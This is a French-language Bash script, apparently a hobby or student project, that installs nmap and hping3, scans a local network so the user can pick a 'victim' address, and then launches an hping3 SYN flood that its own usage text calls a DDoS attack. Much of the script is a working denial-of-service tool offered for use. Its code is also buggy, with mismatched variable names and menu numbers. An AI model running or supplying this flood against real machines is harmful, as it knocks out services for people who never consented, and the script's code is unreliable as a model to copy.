#!/bin/bash
clear
echo ""

#Auteur : Lassechere:Davy

####################################
#  Script qui install et met à jour
#  Hping9 et nmap
# Analyse le trafic réseau avec nmap
# Selection d'une machine Victime
# option du flood
# Flood paquet sur la machine
#
#       Options :
#  Mode Intéractive et non Intéractive
###################################


#les actions

Install-outils () {
if [[ -e /etc/nmap ]] ; then
  $prefix update -y && $prefix upgrade -y
else
        $prefix update -y && $prefix upgrade -y
        $prefix install nmap
fi
clear
if [[ -e /etc/hping3 ]] ; then
  $prefix update -y && $prefix upgrade -y
else
        $prefix update -y && $prefix upgrade -y
        $prefix install hping3
fi
clear


}

Scan-rsx ()     {
        nmap -sP $addrR
        read -p "Choisir l'ip de votre victime : " IPADDRESS
        nmap --traceroute $IPADDRESS
}

Attaq-rsx () {
        hping3 -c $NP -d $TP -S -w 64 -p $PORT --flood $IP


}

Mode-emploi () {
        echo "Voici le manuel du script "
        echo "Le script permet de d'analyser votre réseau et de lancer à la suite une attaque DDOS."
        echo "Il ne requiert pas de commande spécifique, lancez le puis sélectionnez vos paramètres."
        echo "Pour éviter sur-consommation sur la charge de carte réseau de la machine, une limite est placée sur la taille des paquets et la durée du spam"
        echo "Il est recommandé pour un bon test d'avoir plusieurs machines pour le DDOS"
        echo ""
        echo "1.Installez les outils : cela met à jour la configuration software système afin de pouvoir utiliser le script."
        echo ""
        echo "2.Scannez le réseau : vous allez pouvoir determinier l'ip de votre victime avec l'ananlyse du réseau."
        echo ""
        echo "3.Attatquez la machine vitime : Lancez votre attaque sur la machine choisit"
        echo ""
        echo "6.Sortir : Pour quitter le script"
}


#le coeur
le_coeur () {
        #check l'existence de nmap
clear
        #check l'existence de hping3
}

#Entrée en mode interactive
mode_interactive () {
        echo ""
        echo " mettre un code art-assci :D                                                            "


        echo "                                          {En mode Intéractive}                         "
        echo "###############################################################"
        echo ""
        echo "# 1.Installer les outils                  |       5.Mode D'emploi                 #"
        echo "# 2.Scanner le réseau                             |       6.Sortir                      #"
        echo "# 3.Attaquer la machine victime   |                                                     #"
        echo ""
        echo "###############################################################"

        read Options
        case $Options in
        1)
                Install-outils
                read -n 1 -s -r -p "Installation termini  , appuyer sur une touche pour continuer"
                mode_interactive
        ;;
    2)
                read -p "Reseau a analyser : " addrR
                Scan-rsx
                read -n 1 -s -r -p "Scan terminié , appuyer sur une touche pour continuer"
                mode_interactive
        ;;
    3)
                read -p "l'address ip de votre victime : " IPADDRESS
                Attaq-rsx
                read -n 1 -s -r -p "Attaque termini  , appuyer sur une touche pour continuer"
                mode_interactive
        ;;
    4)
                Mode-emploi
                mode_interactive
        ;;
    *)
                exit
  esac
}

#Entrée en mode non intérative
mode_non_interactive () {
        echo "En mode Non intéractive"
}


#Error Gestion :

Error1="Réponse Invalide !"
Error2="Echec à la configuration !"
Error3="Commande Invalide !"
Error4="Argument Invalide !"

#les variables par defauts
Hostname=$(hostname)
IpHost=$(ip a | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v'127.0.0.1')
addrR="192.168.1.0"

#conf
NP="1024"
TP=""
#par def on met 80 pour le web
PORT="53"
#ip de la victime
Ip="192.168.255.255"



#Détecter OS
if [[ $EUID -ne 0 ]]; then
    echo "Merci de démarrer en Root."
    exit 1
fi

SCRIPT_DIR="$( cd "$( dirname "$0" )" && pwd )"
AIRTIMEROOT=${SCRIPT_DIR}

# check la distribution et release ; set boolean flags.
echo "Détection la distribution et la release ..."
is_debian_dist=false
is_debian_stretch=false
is_debian_jessie=false
is_debian_wheezy=false
is_ubuntu_dist=false
is_ubuntu_xenial=false
is_ubuntu_trusty=false
is_centos_dist=false
is_centos_7=false

if [ -e /etc/os-release ]; then
  # infos $ID, $VERSION_CODENAME, $VERSION_ID et $PRETTY_NAME
  source /etc/os-release
  dist=$ID
  code="${VERSION_CODENAME-$VERSION_ID}"
  case "${dist}-${code}" in
    ubuntu-xenial)
      is_ubuntu_dist=true
      is_ubuntu_xenial=true
      ;;
    ubuntu-14.04)
      code="trusty"
      is_ubuntu_dist=true
      is_ubuntu_trusty=true
      ;;
    debian-9)
      code="stretch"
      is_debian_dist=true
      is_debian_stretch=true
      ;;
    debian-8)
      code="jessie"
      is_debian_dist=true
      is_debian_jessie=true
      ;;
    debian-7)
      code="wheezy"
      is_debian_dist=true
      is_debian_wheezy=true
      ;;
    centos-7)
      is_centos_dist=true
      is_centos_7=true
      ;;
    *)
      echo "ERREUR: Distribution \"$PRETTY_NAME\" n'est pas supporté" >&2
      exit 1
      ;;
  esac
else
  echo "ERREUR: La distribution n'est pas supporté" >&2
  exit 1
fi

$is_ubuntu_dist && prefix="apt"
$is_debian_dist && prefix="apt"
$is_centos_dist && prefix="yum"


#Début du script >>>>>>>>>>>>>>>>>>>>

#Sel interactive ou non :

if [[ -z "$1" ]]; then
  mode_interactive
else
  mode_non_interactive $1 $2 $3

fi
